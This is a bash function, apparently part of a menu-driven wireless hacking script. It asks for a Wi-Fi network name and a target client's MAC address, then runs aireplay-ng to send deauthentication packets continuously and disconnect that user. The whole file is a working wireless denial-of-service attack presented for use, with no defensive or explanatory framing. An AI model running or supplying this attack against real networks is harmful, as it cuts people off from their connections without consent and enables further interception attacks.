macAttack(){

    echo " "
    echo -n -e "Enter the name of the Wifi (ESSID):"
    read wifiName
    echo " "
    echo -n -e "Enter the MAC address of the user you want to deauthenticate (STATION):"
    read macClient
    echo " "
    echo -e "proceed to send deauthentication packets to the specified MAC addressr"
    echo " "
    echo -e " wait 1 minute"
    echo " "
    sleep 13

    aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one wlan0
    echo "press 1 to return to menu"
   read a
    if [ $a -eq 1 ]
    then
    wireless
    fi

}

